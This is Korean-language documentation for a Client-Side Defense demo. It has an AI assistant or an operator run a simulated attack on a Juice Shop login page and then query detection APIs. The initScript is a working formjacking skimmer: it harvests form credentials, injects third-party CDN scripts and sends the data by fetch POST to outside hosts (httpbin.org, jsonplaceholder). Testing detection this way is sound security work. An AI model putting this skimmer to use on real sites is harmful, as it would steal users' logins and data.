Phase 2는 보호된 애플리케이션에 대한 시뮬레이션된 공격 트래픽을 생성하고 CSD가 이를 감지했는지 확인합니다. Phase 1이 완료되어야 합니다 — 모든 Step 7 체크가 PASS — 진행하기 전에.

## Step 8: Attack Simulation

<Aside type="note">
이 단계는 브라우저 측 JavaScript 실행이 필요합니다 — `curl`은 CSD 감지를 트리거할 수 없습니다. 브라우저 자동화 도구(MCP Chrome DevTools, Playwright, Puppeteer)를 가진 AI 어시스턴트는 아래의 **AI-Automated Execution** 시퀀스를 사용하여 이러한 단계를 직접 실행합니다. 브라우저 자동화 도구가 없는 운영자는 수동 단계를 수행합니다.
</Aside>

인프라가 확인된 후(모든 Phase 1 Step 7 체크가 PASS), 공격 시뮬레이션 스크립트를 실행하여 CSD 감지를 생성합니다. 스크립트는 [Trigger Detection](/csd/trigger-detection/) 가이드 및 [Attack Script Library](/csd/attack-scripts/)에 정의되어 있습니다.

### AI-Automated Execution

브라우저 자동화 도구를 가진 AI 어시스턴트는 공격 시뮬레이션을 프로그래밍 방식으로 실행합니다:

1. **initScript로 Navigate** — 먼저 `about:blank`로 이동하여 깨끗한 문서 컨텍스트를 확인합니다(이전 네비게이션의 stale initScript 방지), 그 다음 `navigate_page`를 `http://$F5XC_DOMAINNAME/#/login`으로 수행하고, zone.js가 패치하기 전에 네이티브 `setInterval`, `clearInterval`, `fetch`, `console.log`를 저장하는 `initScript` 사용, 로그인 양식 필드를 폴링, 네이티브 `HTMLInputElement.prototype.value` setter를 통해 자격 증명을 채움, Combined Detection Script를 인라인으로 즉시 실행. 아래의 verbatim initScript를 사용하세요.
2. **Welcome Banner 닫기** — `press_key`를 `Escape`로 사용하여 Welcome Banner를 닫습니다. 후속 방문 시 배너가 나타나지 않을 수 있습니다(쿠키 지속됨). 쿠키 동의 대화상자는 Escape 키로 자동 해제됩니다.
3. **완료 대기** — 모든 CDN 스크립트 로드/오류 콜백 및 fetch 프로미스 해결이 완료되기를 10초 대기
4. **증거 캡처** — `list_console_messages`를 사용하여 `[CSD Demo] Simulation complete` 및 CDN 로드 결과 확인; `list_network_requests`를 `script` 및 `fetch` 타입으로 필터링하여 HTTP 상태 코드(`200`/`201` 성공, `pending` 보류 요청) 확인

**Phase 2 initScript (정확히 쓰인 대로 — 정확히 이대로 사용하세요):**

```javascript
// Save native references before zone.js patches them
var _si = window.setInterval.bind(window);
var _ci = window.clearInterval.bind(window);
var _fetch = window.fetch.bind(window);
var _log = window.console.log.bind(window.console);

// Poll for login form fields, fill credentials, run detection script
var _poll = _si(function() {
  var emailEl = document.querySelector('#email');
  var passEl  = document.querySelector('#password');
  if (emailEl && passEl) {
    _ci(_poll);
    // Fill credentials via native setter (bypasses zone.js)
    var nativeSet = Object.getOwnPropertyDescriptor(
      window.HTMLInputElement.prototype, 'value').set;
    nativeSet.call(emailEl, 'test@example.com');
    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
    nativeSet.call(passEl, 'P@ssword123');
    passEl.dispatchEvent(new Event('input', { bubbles: true }));

    // Run Combined Detection Script inline using native fetch for exfil
    (function() {
      _log('==================================================');
      _log('[CSD Demo] Combined Detection Script — Starting');
      _log('==================================================');

      _log('\n[Formjack] Phase 1: Form field harvesting');
      var inputs = document.querySelectorAll('input');
      var harvested = {};
      inputs.forEach(function(input) {
        var name = input.name || input.id || input.type;
        harvested[name] = input.value || '(empty)';
      });
      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);

      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
      var cdns = [
        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
      ];
      cdns.forEach(function(cdn) {
        var script = document.createElement('script');
        script.src = cdn.url;
        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
        document.head.appendChild(script);
        _log('[Supply Chain] Injected script tag: ' + cdn.name);
      });

      _log('\n[Exfil] Phase 3: Data exfiltration');
      var payload = JSON.stringify({
        type: 'combined_demo', credentials: harvested,
        page: window.location.href, timestamp: Date.now()
      });
      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
      _fetch('https://jsonplaceholder.typicode.com/posts', {
        method: 'POST', mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' }, body: payload
      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });

      _log('\n==================================================');
      _log('[CSD Demo] Simulation complete');
      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
      _log('==================================================');
    })();
  }
}, 300);
```

<Aside type="caution">
**zone.js 비호환성** — Juice Shop는 Angular의 zone.js를 사용합니다. zone.js는 `setTimeout`, `setInterval`, `fetch`, `XMLHttpRequest` 및 기타 브라우저 API를 패치합니다. 이는 `Cannot read properties of undefined (reading 'call')`로 인해 MCP `evaluate_script`, `fill`, `click` 도구를 중단시킵니다. 대신 `navigate_page`를 `initScript`와 함께 사용하세요 — `initScript`는 zone.js 로드 전에 실행되므로 네이티브 API 참조를 저장하고 폴링 콜백에서 사용할 수 있습니다. initScript는 네이티브 `HTMLInputElement.prototype.value` setter를 사용하여 양식 필드를 채우고(`fill` 아님) detection script를 인라인으로 실행해야 합니다(`setTimeout`이 아님. 이는 페이지 로드 후 zone.js가 가로챌 수 있음). 자세한 내용은 [Trigger Detection — AI-Automated Execution](/csd/trigger-detection/#ai-automated-execution)을 참조하세요.
</Aside>

<Aside type="note">
**initScript 누적** — 각 `navigate_page` 호출(with `initScript` parameter)은 스크립트를 모든 후속 문서 로드에서 실행되는 persistent list에 추가합니다. stale script가 간섭하지 않도록 하려면 실행 사이에 `about:blank`로 이동하거나 깨끗한 브라우저 컨텍스트를 위해 `new_page`를 `isolatedContext`와 함께 사용하세요.
</Aside>

<Aside type="note">
**initScript에서 네이티브 `fetch` 저장** — initScript는 zone.js가 패치하기 전에 `window.fetch.bind(window)`를 저장합니다. 이는 zone.js `Cannot read properties of undefined` 오류 없이 fetch 호출이 올바르게 작동하도록 합니다. 동일한 initScript(saved native `fetch`)는 Phase 2 및 Phase 3 공격 실행 모두에 사용됩니다 — CSD mitigation은 `fetch()` 호출을 가로채지 않으므로 네이티브 참조 저장은 mitigation 동작에 영향을 주지 않습니다.
</Aside>

<Aside type="caution">
**Transient origin 404** — Angular 애플리케이션으로의 첫 네비게이션 시, `polyfills.js` 또는 기타 앱 스크립트가 원본 서버에서 transient HTTP 404를 반환할 수 있습니다. 이로 인해 Angular 부트스트래핑이 실패하여 로그인 양식이 없는 빈 페이지가 표시됩니다. 404는 ephe 경입니다 — 후속 요청은 200 또는 304를 반환합니다. **복구:** `about:blank`로 이동, 2초 대기, 그 다음 네비게이션 재시도. 여러 재시도 후에도 문제가 지속되면 로드 밸런서 경로를 통해 원본 상태를 확인하세요(`curl -s -o /dev/null -w '%{http_code}' http://$F5XC_DOMAINNAME/polyfills.js`).
</Aside>

### Manual Execution

브라우저 자동화 도구가 없는 운영자는 단계를 수동으로 수행합니다:

1. **Navigate** 보호된 애플리케이션 로그인 페이지로: `http://xF5XC_DOMAINNAMEx/#/login`
2. **더미 자격 증명 입력** — Email 필드에 `test@example.com`을 입력하고 Password 필드에 `P@ssword123`을 입력합니다(양식을 제출하지 마세요).
3. **DevTools 열기** — **F12**를 누르고 **Console** 탭으로 전환합니다.
4. **Combined Detection Script 실행** — [Trigger Detection &mdash; Run the Combined Simulation Script](/csd/trigger-detection/#run-the-combined-simulation-script)에서 스크립트를 콘솔에 붙여넣고 Enter를 누릅니다.
5. **콘솔 출력 확인** — `[CSD Demo]` 단계별 출력이 다음을 나타내는지 확인합니다: 양식 필드 수집, 4개 CDN 도메인의 스크립트 삽입, 2개 엔드포인트로의 데이터 유출

### What Gets Triggered

| Signal | Behavior | Detection |
| --- | --- | --- |
| Form field harvesting | 이메일 및 비밀번호 입력 값 읽기 | 민감한 양식 필드를 읽는 스크립트 — High Risk로 플래그됨 |
| Script injection | `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io`에서 4개의 `&lt;script&gt;` 태그 삽입 | 최대 4개의 새로운 서드파티 스크립트 도메인 감지(CDN 가용성 변함) |
| Data exfiltration | 수집된 데이터를 `fetch`를 통해 `www.httpbin.org` 및 `jsonplaceholder.typicode.com`으로 전송 | 외부 도메인으로의 네트워크 호출 |

<Aside type="note">
**CDN 가용성은 변합니다.** 모든 4개 CDN 스크립트가 모든 실행에서 로드되지는 않습니다 — 브라우저 리소스 제한, 네트워크 조건 또는 CDN 스로틀링으로 인해 일부가 `ERR_INSUFFICIENT_RESOURCES` 또는 타임아웃으로 실패할 수 있습니다. **최소 하나의** CDN 스크립트가 로드되면 시뮬레이션이 성공합니다. CSD는 스크립트 로드 성공 여부와 관계없이 삽입 시도를 감지합니다 — `&lt;script&gt;` 태그 생성 자체가 감지 신호입니다.

심각한 경우, `ERR_INSUFFICIENT_RESOURCES`는 페이지 수준 실패로 확대될 수 있습니다 — 전체 페이지가 공백이 되고, 스크린샷이 타임아웃되며, `take_snapshot`이 실패합니다. 이는 동일한 브라우저 컨텍스트에 heavy initScript가 여러 네비게이션 후 누적된 후 일반적으로 발생합니다. **복구:** `new_page`를 `isolatedContext`와 함께 사용하여 깨끗한 브라우저 컨텍스트를 만든 다음 `about:blank` → `navigate_page` with initScript 시퀀스에서 재시도합니다. 이는 개별 CDN 스크립트 실패(시뮬레이션 성공에 영향을 주지 않음)와 다릅니다.
</Aside>

<Aside type="tip">
공격 시뮬레이션 실행 후, 이 결정론적 폴링 루프를 사용하여 감지를 대기합니다:

1. 60초마다 `/detected_domains` 쿼리
2. DET-3이 pass하면(exfil 도메인이 `/detected_domains`에 나타남), 즉시 Step 9로 진행
3. 10개 쿼리(10분) 후에도 여전히 비어있으면, CSD 상태(Phase 1 Step 5) 및 보호된 도메인 등록(Phase 1 Step 6) 확인 — 이 중 하나가 misconfigured일 가능성이 높음
4. 30개 쿼리(30분) 후에도 여전히 비어있으면, 중단하고 운영자에게 보고 — Phase 3으로 계속 진행하지 마세요

개별 공격 카테고리 또는 최대 감지 스트레스 테스트를 위한 추가 targeted 시뮬레이션은 [Attack Script Library](/csd/attack-scripts/)를 참조하세요.
</Aside>

### Evidence

AI 어시스턴트는 다음을 보고해야 합니다. AI-automated execution의 경우, 증거는 `list_console_messages`를 통해 프로그래밍 방식으로 캡처됩니다(initScript의 폴링 함수는 결과를 콘솔에 기록합니다). 수동 실행의 경우, 운영자는 브라우저 콘솔 출력을 읽습니다.

| Check | Expected | Status |
| --- | --- | --- |
| Login page loaded | `200 OK` at `http://$F5XC_DOMAINNAME/#/login` | PASS / FAIL |
| Console script executed | 콘솔 출력에 `[CSD Demo] Simulation complete` | PASS / FAIL |
| Fields harvested | 콘솔 출력에서 Count &gt; 0 | PASS |
| Scripts injected | 콘솔 출력에서 1–4 CDN 도메인(일부는 리소스 오류로 실패할 수 있음) | CDN 도메인이 나타나면 PASS |
| Exfil channels | 콘솔 출력에서 2개 fetch POST 시도 | PASS |

<Aside type="tip">
HTTPS LB 인증서가 유효한 경우(`CertificateValid`), 선택적으로 `https://$F5XC_DOMAINNAME/#/login`에 대해 시뮬레이션을 실행할 수도 있습니다. 이는 데모 진행에 필수가 아닙니다.
</Aside>

## Step 9: Detection Verification via API

감지가 나타났는지 확인하기 위해 CSD API 엔드포인트를 쿼리합니다. 폴링 루프를 사용하세요: 60초마다 `/detected_domains`를 쿼리; DET-3이 pass하자마자 진행합니다. DET-3이 10분 후에 pass하지 않으면, CSD 구성을 확인하세요. DET-3이 30분 후에 pass하지 않으면, 중단하고 운영자에게 보고합니다. 이러한 엔드포인트는 [API Reference](/csd/api-reference/)에 설명되어 있으며 이전 단계와 동일한 인증 및 네임스페이스를 사용합니다.

<Aside type="note">
**Endpoint processing order:** `/detected_domains`가 먼저 채워지며 CSD 파이프라인이 작동하고 있음을 나타내는 주요 지표입니다. `/scripts` 및 `/formFields`는 더 느린 백엔드 처리 일정에 채워지며 여러 시뮬레이션 실행 후에도 20–30분 동안 비어있을 수 있습니다. `/detected_domains`이 exfil 도메인(`www.httpbin.org`, `jsonplaceholder.typicode.com`)을 표시하면, 시뮬레이션이 성공적으로 감지된 것으로 간주하고 진행하세요 — 아래의 DET-1 체크가 이를 반영합니다.
</Aside>

### Detected Scripts

지난 24시간 동안 감지된 스크립트 쿼리:

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s -X POST \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  -H "Content-Type: application/json" \
  -d "{\"startTime\": \"$START\", \"endTime\": \"$NOW\"}" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/scripts" \
  | jq '{total: (.scripts | length), scripts: [.scripts[]? | {script_name: .script_name, risk_level: .risk_level}]}'
```

| Field | Expected | Status |
| --- | --- | --- |
| `total` | &gt; 0 (감지된 스크립트) | &gt; 0이면 PASS; `/detected_domains`이 exfil 도메인을 표시하지만 0이면 PENDING |
| Script names | `script_name`에 CDN 도메인 포함(`cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io`) | 삽입된 CDN 도메인이 나타나면 PASS |

### Detected Domains

```bash
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/detected_domains" \
```

| --- | --- | --- |
| `total_domains` | &gt; 0 | &gt; 0이면 PASS |
| Domain list | CDN 및 exfil 도메인 포함 | 예상 도메인이 나타나면 PASS |

### Form Fields

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/formFields?startTime=$START&endTime=$NOW" \
  | jq '{total: .total_size, fields: [.form_fields[]? | {name: .name, sensitivity: .analysis.value, scripts: (.associated_scripts | length), locations: .locations}]}'
```

| Field | Expected | Status |
| --- | --- | --- |
| `total` | &gt; 0 | &gt; 0이면 PASS; DET-3이 pass하지만 0이면 PENDING |
| `name` | `email`, `password` 포함 | 민감한 필드가 나타나면 PASS |
| `sensitivity` | 이메일/비밀번호 필드에 대해 `Sensitive` | ML이 올바르게 분류하면 PASS |

<Aside type="note">
**Form field processing은 domain detection보다 느립니다.** `/formFields` 엔드포인트는 첫 쿼리에서 불완전한 메타데이터가 있는 필드를 반환할 수 있습니다. ML sensitivity 분류(`Sensitive` vs `Not Sensitive`)는 백엔드 처리가 완료된 후 채워집니다 — 이는 첫 시뮬레이션 실행 후 20–30분 걸릴 수 있습니다. 필드가 표시되지만 분류가 부족하면, 나중에 다시 쿼리하세요. DET-3(`/detected_domains`)이 주요 pass 기준입니다.
</Aside>
